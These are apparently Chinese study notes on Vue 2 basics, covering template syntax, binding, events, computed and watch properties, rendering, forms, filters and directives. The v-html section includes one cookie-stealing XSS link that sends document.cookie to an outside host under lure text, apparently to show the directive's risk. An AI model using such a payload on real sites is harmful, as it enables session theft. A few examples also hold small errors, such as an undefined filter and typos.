# 初识VUE

1. 想让VUE工作，必须创建一个Vue实例，且要传入一个配置对象。

2. root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法。

3. root容器里的代码被称为【Vue模板】。

4. Vue实例和容器是一一对应的。

5. 真实开发中只有一个Vue实例，并且会配合着组件一起使用。

6. {{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性。

7. 一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新。

```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>初始vue</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 
            注意区分：js表达式 和 js代码(语句)
                    1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：
                                (1). a
                                (2). a+b
                                (3). demo(1)
                                (4). x === y ? 'a' : 'b'

                    2.js代码(语句)
                                (1). if(){}
                                (2). for(){}
    -->

    <!-- 这是一个容器 -->
    <div id="demo">
        <h1>Hello, {{name.toUpperCase()}}, {{address}}</h1>
    </div>
    <script>
        // 阻止vue在启动时生成生产提示
        Vue.config.productionTip = false

        // 创建vue实例
        var app = new Vue({
            el: '#demo', // el指定vue实例为哪个容器服务
            data: {
                name: 'shanla',
                address: '杭州'
            }
        })
    </script>
</body>
```

# 模板语法

VUE分为两种模板语法，插值语法和指令语法。

1. 插值语法用于解析标签体内容。

2. 指令语法用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。

```html
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        Vue模板语法有2大类：
            1.插值语法：
                    功能：用于解析标签体内容。
                    写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
            2.指令语法：
                    功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
                    举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
                                且可以直接读取到data中的所有属性。
                    备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。
    -->
    <div id="root">
        <h1>插值语法</h1>
        <h3>你好，{{name}}</h3>
        <hr>
        <h1>指令语法</h1>
        <a v-bind:href="website.url.toUpperCase()" v-bind:x="hello">点我去{{website.name}}</a>
        <!-- 缩写方式 -->
        <a :href="website.url" x="hello1">点我去{{website.name}}</a>
    </div>
    <script>
        Vue.config.productionTip = false

        new Vue({
            el: "#root",
            data: {
                name: 'shanla',
                website: {
                    name: '百度',
                    url: 'http://www.baidu.com'
                },
                hello: "你好"
            }
        })
    </script>
</body>
```

# 数据绑定

数据绑定分为单向绑定和双向绑定。

- 单向绑定(v-bind)：数据只能从data流向页面。

- 双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
  
  - 双向绑定一般都应用在表单类元素上（如：input、select等）
  
  - v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。

```html
<body>
    <!-- 容器 -->
    <div id="root">
        <!-- 普通写法 -->
        单向数据绑定：<input type="text" v-bind:value="name"><br>
        双向数据绑定：<input type="text" v-model:value="name"><br>

        <!-- 简写 -->
        单向数据绑定：<input type="text" :value="name"><br>
        双向数据绑定：<input type="text" v-model="name"><br>
    </div>

    <script>
        Vue.config.productionTip = false

        var vm = new Vue({
            el: '#root',
            data: {
                name: 'shanla'
            }
        })
    </script>
</body>
```

# MVVM模型

M：Model，模型，对应data

V：View，视图，对应模板

VM：ViewModel，视图模型，对应vue实例

![](/Users/kx/Library/Application%20Support/marktext/images/2023-10-16-15-31-13-image.png)

# 数据代理

Js中的数据代理：通过一个对象代理对另一个对象中的属性进行操作（读/写）。

```js
let obj = {
    x: 100
}
let obj2 = {
    y: 200
}

// 通过obj2代理obj
Object.defineProperty(obj2, 'x', {
    get() {
        return obj.x
    },
    set(value) {
        obj.x = value
    }
})
```

Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）

实现原理：通过`Object.defineProperty()`把data对象中所有属性添加到vm上，为每一个添加到vm上的属性，都指定一个getter/setter，再getter/setter内部去操作（读/写）data中对应的属性。

```html
<body>
    <div id="root">
        <h2>姓名：{{name}}</h2>
        <h2>班级：{{class1}}</h2>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '周杰伦',
                class1: '三年二班'
            }
        })
    </script>
</body>
```

# 事件处理

### 1. 事件监听

事件绑定使用`v-on:xxx`或`@xxx`，其中`xxx`是事件名，事件回调需要配置到`methods`，最终会到vm上。

```html
<body>
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- <button v-on:click="showInfo">点我获取信息</button> -->
        <button @click="showInfo">点我获取信息</button>
        <button @click="showInfo2($event, 66)">点我获取信息2</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '清华大学'
            },
            methods: {
                showInfo(event) {
                    console.log(event.target.innerHTML)
                    alert('这是你要的信息')
                },
                showInfo2(event, number) {
                    console.log(event.target.innerHTML)
                    console.log(number)
                    alert('这是你要的信息！！')
                }
            }
        })
    </script>
</body>
```

### 2. 事件修饰符

尽管能够在事件函数方法处理`event.preventDefault()`等，但vue为了保持函数内尽量只处理业务，使用了事件修饰符来处理类似的DOM 事件细节。

```html
<body>
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- 阻止默认事件（常用） -->
        <a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>

        <!-- 阻止事件冒泡（常用） -->
        <div class="demo1" @click="showInfo">
            <button @click.stop="showInfo">点我提示信息</button>
            <!-- 修饰符可以连续写 -->
            <!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
        </div>

        <!-- 事件只触发一次（常用） -->
        <button @click.once="showInfo">点我提示信息</button>

        <!-- 使用事件的捕获模式 -->
        <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click="showMsg(2)">
                div2
            </div>
        </div>

        <!-- 只有event.target是当前操作的元素时才触发事件； -->
        <div class="demo1" @click.self="showInfo">
            <button @click="showInfo">点我提示信息</button>
        </div>

        <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕； -->
        <ul @wheel.passive="demo" class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>

    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '清华大学',
            },
            methods: {
                showInfo() {
                    alert('这是一个提示信息')
                },
                showMsg(msg) {
                    console.log(msg)
                },
                demo(){
                    for (let i = 0; i < 100000; i++) {
                        console.log('#')
                    }
                    console.log('累坏了')
                }
            }
        })
    </script>
</body>
```

# 计算属性

计算属性是为了解决模板语法处理复杂业务使得代码看起来很复杂的问题，更重要的是**计算属性是基于它们的响应式依赖进行缓存的**

```html
<body>
    <div id="root">
        姓：<input type="text" v-model="firstName"> <br/><br/>
        名：<input type="text" v-model="lastName"> <br/><br/>
        全名：<input type="text" v-model="fullName">
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                firstName: '山',
                lastName: '辣'
            },
            computed: {
                // fullName:{
                //     //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                //     //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
                //     get(){
                //         console.log('get被调用了')
                //         // console.log(this) //此处的this是vm
                //         return this.firstName + '-' + this.lastName
                //     },
                //     //set什么时候调用? 当fullName被修改时。
                //     set(value){
                //         console.log('set',value)
                //         const arr = value.split('-')
                //         this.firstName = arr[0]
                //         this.lastName = arr[1]
                //     }
                // }
                // 这样简写只有getter，没有setter
                fullName(){
                    console.log('获取时才被调用')
                    return this.firstName + '-' + this.lastName
                }
            }
        })
    </script>
</body>
```

# 监视属性

vue提供的更通用的方式来观察和响应vue实例上的数据变动就是监视属性（侦听属性），不仅可以监视普通属性，也可以监听计算属性。

```html
<body>
    <div id="root">
        姓：<input type="text" v-model="firstname"><br>
        名：<input type="text" v-model="lastname"><br>
        全名：<span>{{fullname}}</span>
    </div>
    <script>
        const firstname = '山'
        const lastname = '辣'
        const vm = new Vue({
            el: '#root',
            data: {
                firstname: firstname,
                lastname: lastname,
                fullname: firstname + '-' + lastname
            },
            watch: {
                firstname(val) {
                    this.fullname = val + '-' + this.lastname
                },
                lastname(val) {
                    this.fullname = this.firstname + '-' + val
                }
            }
        })
    </script>
</body>
```

# 绑定样式

绑定样式分为绑定class类和style样式表

```html
<body>
    <div id="root">
        <!-- 字符串写法，适用于：样式的类名不确定，需要动态指定 -->
        <div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
        <!-- 数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
        <div class="basic" :class="classArr">{{name}}</div> <br/><br/>
        <!-- 对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div> <br/><br/>
        <!-- 绑定style样式对象写法 -->
        <div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
        <!-- 绑定style样式数组写法 -->
        <div class="basic" :style="styleArr">{{name}}</div>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '清华大学',
                mood: 'normal',
                classArr: ['qinghua1', 'qinghua2', 'qinghua3'],
                classObj: {
                    'qinghua1': true,
                    'qinghua2': true,
                    'qinghua3': false
                },
                styleObj: {
                    fontSize: '40px',
                    color:'red',
                },
                styleArr: [
                    {
                        fontSize: '40px',
                        color:'blue',
                    },
                    {
                        backgroundColor:'gray'
                    }
                ]
            },
            methods: {
                changeMood() {
                    const arr = ['happy','sad','normal']
                    const index = Math.floor(Math.random()*3)
                    this.mood = arr[index]
                }
            }
        })
    </script>
</body>
```

# 条件渲染

```html
<body>
    <div id="root">
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>

        <!-- 使用v-show做条件渲染 ：display-->
        <h2 v-show="false">欢迎来到{{name}}</h2>
        <h2 v-show="1 === 1">欢迎来到{{name}}</h2>

        <!-- 使用v-if做条件渲染 ： 节点直接没了-->
        <h2 v-if="false">欢迎来到{{name}}</h2>
        <h2 v-if="1 === 1">欢迎来到{{name}}</h2>

        <!-- v-else和v-else-if -->
        <div v-if="n === 1">Angular</div>
        <div v-else-if="n === 2">React</div>
        <div v-else-if="n === 3">Vue</div>
        <div v-else>哈哈</div>

        <!-- v-if与template的配合使用 -->
        <template v-if="n === 1">
            <h2>你好</h2>
            <h2>北京</h2>
        </template>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '剑桥大学',
                n: 0
            }
        })
    </script>
</body>
```

# 列表渲染

```html
<body>
    <div id="root">
        <h2>人员列表（遍历数组）</h2>
        <!-- 遍历数组 -->
        <ul>
            <li v-for="(p,index) of persons" :key="index">
                {{p.name}}-{{p.age}}
            </li>
        </ul>
        <h2>汽车信息（遍历对象）</h2>
        <!-- 遍历对象 -->
        <ul>
            <li v-for="(value, k) of car" :key="k">
                {{k}}-{{value}}
            </li>
        </ul>
        <h2>遍历字符串</h2>
        <ul>
            <li v-for="(char, index) of str" :key="index">
                {{char}}-{{index}}
            </li>
        </ul>
        <h2>遍历指定次数</h2>
        <ul>
            <li v-for="(number, index) of 5" :key="index">
                {{index}}-{{number}}
            </li>
        </ul>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                persons: [
                    {id:'001',name:'张三',age:18},
                    {id:'002',name:'李四',age:19},
                    {id:'003',name:'王五',age:20}
                ],
                car: {
                    name: '丰田雷凌',
                    price: '16万',
                    color: '米白'
                },
                str:'hello'
            }
        })
    </script>
</body>
```

# 收集数据

数据收集主要靠`v-model`进行收集，可以通过一些修饰符

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>收集表单数据</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
            收集表单数据：
                    若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
                    若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
                    若：<input type="checkbox"/>
                            1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                            2.配置input的value属性:
                                    (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                                    (2)v-model的初始值是数组，那么收集的的就是value组成的数组
                    备注：v-model的三个修饰符：
                                    lazy：失去焦点再收集数据
                                    number：输入字符串转为有效的数字
                                    trim：输入首尾空格过滤
        -->
    <div id="root">
        <form @submit.prevent="demo">
            账号：<input type="text" name="account" v-model.trim="userInfo.account"><br>
            密码：<input type="password" name="password" v-model="userInfo.password"><br>
            年龄：<input type="number" name="age" v-model.number="userInfo.age"><br>
            性别：
            男<input type="radio" name="sex" value="male" v-model="userInfo.sex">
            女<input type="radio" name="sex" value="frmale" v-model="userInfo.sex"><br>
            爱好：
            抽烟<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="smoking">
            喝酒<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="drinking">
            烫头<input type="checkbox" name="hobby" v-model="userInfo.hobby" value="hot_head"><br>
            城市：
            <select name="city" v-model="userInfo.city">
                <option value="北京">北京</option>
                <option value="上海">上海</option>
                <option value="广州">广州</option>
                <option value="深圳">深圳</option>
            </select>
            其他信息：
            <textarea v-model.lazy="userInfo.other"></textarea><br>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="www.baidu.com">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                userInfo: {
                    account: '',
                    password: '',
                    age: 18,
                    sex: 'female',
                    hobby: [],
                    city: '北京',
                    other:'',
                    agree:''
                }
            },
            methods: {
                demo() {
                    console.log(JSON.stringify(this.userInfo))
                }
            },
        })
    </script>
</body>
</html>
```

# 过滤器

过滤器`filters`区别于`computed`、`methods`可以通过管道符传递数据，但并非必须使用。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>过滤器</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <input type="text" placeholder="请输入你的名字" v-model="name">
        <h2>原数据：{{name}}</h2>
        <!-- 通过计算属性实现 -->
        <h2>computed后：{{computedName}}</h2>
        <!-- 通过methods实现 -->
        <h2>methods后：{{fmtName()}}</h2>
        <!-- 通过过滤实现 -->
        <h2>filters后：{{ name | capitalize | mySlice }}</h2>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: '',
            },
            computed: {
                computedName: function() {
                    val = this.name.toString()
                    return val.charAt(0).toUpperCase() + val.slice(1)
                }
            },
            methods: {
                fmtName() {
                    val = this.name.toString()
                    return val.charAt(0).toUpperCase() + val.slice(1)
                }
            },
            filters: {
                capitalize: function(val) {
                    val = val.toString()
                    return val.charAt(0).toUpperCase() + val.slice(1)
                }
            }
        })
    </script>
</body>
</html>
```

# 内部指令

### v-text

`v-text`向其所在的节点中渲染文本内容，与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-text指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>你好,{{name}}</div>
        <div v-text="name"></div>
        <div v-text="str"></div>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'shanla',
                str: '<h2>shanla</h2>'
            }
        })
    </script>
</body>
</html>
```

### v-html

`v-html`用来更新元素的html，内容会按照普通html进行插入，不会作为Vue模板进行编译。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <div>你好，{{nmame}}</div>
        <div v-html="str"></div>
        <div v-html="str1"></div>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                name: 'shanla',
                str: '<h3>你好啊！</h3>',
                str1: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
            }
        })
    </script>
</body>
</html>
```

### v-cloak

有时候因为加载延时问题，例如卡掉了，数据没有及时刷新，就造成了页面显示从`{{name}}`到name变量“shanla”的变化，这样闪动的变化，会造成用户体验不好。

此时需要使用到`v-cloak`的这个标签。在vue解析之前，div属性中有`v-cloak`这个标签，在vue解析完成之后，v-cloak标签被移除。简单，类似div开始有一个css属性`display:none;`，加载完成之后，css属性变成`display:block`，元素显示出来。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-cloak指令</title>
    <style>
        [v-cloak] {
            display: none;
        }
    </style>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2 v-cloak>{{name}}</h2>
    </div>
    <script>
        console.log(1)
        new Vue({
            el:'#root',
            data:{
                name:'shanla'
            }
        })
    </script>
</body>
</html>
```

### v-once

`v-once`只渲染元素和组件一次。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-once</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2 v-once>初始化的n值是:{{n}}</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我+1</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                n: 0
            }
        })
    </script>
</body>
</html>
```

### v-pre

有时候我们需要直接输出{{n}}，不被vue解析，通过`v-pre`指令实现。

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-pre指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <div id="root">
        <h2 v-pre>{{n}}</h2>
        <h2 >当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script>
        const vm = new Vue({
            el: '#root',
            data: {
                n: 1
            }
        })
    </script>
</body>
</html>
```
